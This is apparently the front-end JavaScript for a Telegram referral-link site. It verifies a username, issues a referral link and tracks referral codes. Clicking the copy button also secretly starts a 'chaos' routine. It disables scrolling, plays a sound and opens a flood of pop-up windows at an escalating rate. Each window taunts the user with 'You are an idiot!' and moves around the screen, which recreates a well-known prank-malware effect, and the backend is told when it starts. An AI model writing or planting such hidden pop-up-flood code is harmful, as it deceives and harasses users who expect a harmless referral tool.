// Replace with your backend URL
const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Update this to your actual backend URL

// Check for referral code in URL
const urlParams = new URLSearchParams(window.location.search);
const referralCode = urlParams.get('referralCode');

if (referralCode) {
  // Store referral code in local storage
  localStorage.setItem('referralCode', referralCode);
}

const verifyButton = document.getElementById('verifyButton');
const copyButton = document.getElementById('copyButton');
const telegramUsernameInput = document.getElementById('telegramUsername');
const verificationMessage = document.getElementById('verificationMessage');
const loadingContainer = document.getElementById('loading');
const verificationContent = document.getElementById('verificationContent');
const referralSection = document.getElementById('referralSection');
const referralLinkInput = document.getElementById('referralLink');
const chaosSound = document.getElementById('chaosSound');

verifyButton.addEventListener('click', async () => {
  let telegramUsername = telegramUsernameInput.value.trim();

  if (!telegramUsername) {
    displayMessage('Please enter your Telegram username.', 'error');
    return;
  }

  telegramUsername = telegramUsername.toLowerCase();

  // Show loading
  showLoading(true);

  try {
    const response = await fetch(`${backendUrl}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ telegramUsername }),
    });

    const data = await response.json();

    if (data.success) {
      // Display the referral link
      showLoading(false);
      showReferralSection(true);
      const referralLink = `https://knckd.github.io/telegram-dpreferral-frontend/?referralCode=${data.referralCode}`;
      referralLinkInput.value = referralLink;

      // If there's a stored referral code, send it to the backend
      const storedReferralCode = localStorage.getItem('referralCode');

      if (storedReferralCode) {
        await fetch(`${backendUrl}/api/referral`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ referralCode: storedReferralCode }),
        });
        console.log('Referral recorded successfully.');
        // Clear the stored referral code
        localStorage.removeItem('referralCode');
      }
    } else {
      showLoading(false);
      displayMessage(data.message || 'Verification failed. Please try again.', 'error');
    }
  } catch (error) {
    console.error('Error:', error);
    displayMessage('An error occurred during verification. Please try again.', 'error');
    showLoading(false);
  }
});

copyButton.addEventListener('click', () => {
  const referralLink = referralLinkInput.value;
  if (referralLink) {
    navigator.clipboard.writeText(referralLink)
      .then(() => {
        alert('Referral link copied to clipboard!');
        // Start chaotic effects
        startChaos();
        // Notify the backend of chaos starting
        notifyBackendOfChaos();
      })
      .catch(err => {
        console.error('Failed to copy:', err);
        alert('Failed to copy the referral link. Please try manually.');
      });
  }
});

// Display messages to the user
function displayMessage(message, type) {
  verificationMessage.textContent = message;
  verificationMessage.className = type; // Add classes like 'error' or 'success' for styling
}

// Show or hide loading
function showLoading(isLoading) {
  loadingContainer.style.display = isLoading ? 'block' : 'none';
  verificationContent.style.display = isLoading ? 'none' : 'block';
}

// Show or hide referral section
function showReferralSection(show) {
  referralSection.style.display = show ? 'block' : 'none';
}

// Notify backend about chaos initiation
async function notifyBackendOfChaos() {
  try {
    await fetch(`${backendUrl}/api/startChaos`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: 'Chaos started!' }),
    });
    console.log('Chaos event logged.');
  } catch (error) {
    console.error('Error logging chaos event:', error);
  }
}

// Tab functionality
const tabButtons = document.querySelectorAll('.tab-button');
const tabContents = document.querySelectorAll('.tab-content');

tabButtons.forEach(button => {
  button.addEventListener('click', () => {
    // Remove 'active' class from all buttons and contents
    tabButtons.forEach(btn => btn.classList.remove('active'));
    tabContents.forEach(content => content.classList.remove('active'));

    // Add 'active' class to clicked button and corresponding content
    button.classList.add('active');
    const tabId = button.getAttribute('data-tab');
    document.getElementById(tabId).classList.add('active');
  });

  // Allow keyboard navigation
  button.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      button.click();
    }
  });
});

// Function to start chaotic effects by duplicating browser windows
let chaosInterval;
let chaosCount = 0;

function startChaos() {
  // Play sound effect if available
  if (chaosSound) {
    chaosSound.play();
  }

  // Disable scrolling
  document.body.classList.add('no-scroll');

  // Start the chaos by spawning windows rapidly
  chaosInterval = setInterval(() => {
    createChaosWindow();
    chaosCount++;

    // Escalate the chaos by increasing spawn rate
    if (chaosCount === 20) {
      clearInterval(chaosInterval);
      chaosInterval = setInterval(createChaosWindow, 200);
    } else if (chaosCount === 50) {
      clearInterval(chaosInterval);
      chaosInterval = setInterval(createChaosWindow, 100);
    }
  }, 500);

  // Stop the chaos after a certain time or based on user interaction
  setTimeout(() => {
    endChaos();
  }, 60000); // Chaos lasts for 60 seconds

  // Allow user to end the chaos with a key combination
  document.addEventListener('keydown', function (event) {
    if (event.ctrlKey && event.shiftKey && event.key === 'X') {
      endChaos();
    }
  });
}

function createChaosWindow() {
  const chaosWindow = window.open('', '_blank', 'width=300,height=200');

  if (chaosWindow) {
    chaosWindow.document.write(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <title>Chaos Window</title>
        <style>
          body {
            margin: 0;
            padding: 0;
            background-color: yellow;
            color: black;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
          }
          h1 {
            font-size: 24px;
            animation: shake 0.5s infinite;
          }
          @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
          }
        </style>
      </head>
      <body>
        <h1>You are an idiot!</h1>
      </body>
      </html>
    `);

    // Move the window to a random position after a short delay
    setTimeout(() => {
      const x = Math.floor(Math.random() * (screen.width - 300));
      const y = Math.floor(Math.random() * (screen.height - 200));
      chaosWindow.moveTo(x, y);
    }, 1000);

    // Close the window after a random time between 5-15 seconds
    setTimeout(() => {
      chaosWindow.close();
    }, Math.random() * 10000 + 5000);
  } else {
    console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
    endChaos(); // End chaos if pop-ups are blocked
  }
}

function endChaos() {
  // Clear all intervals by resetting the chaos effect
  clearInterval(chaosInterval);
  chaosCount = 0;

  // Remove no-scroll class
  document.body.classList.remove('no-scroll');

  // Stop sound
  if (chaosSound) {
    chaosSound.pause();
    chaosSound.currentTime = 0;
  }

  alert('The chaos has ended!');
}
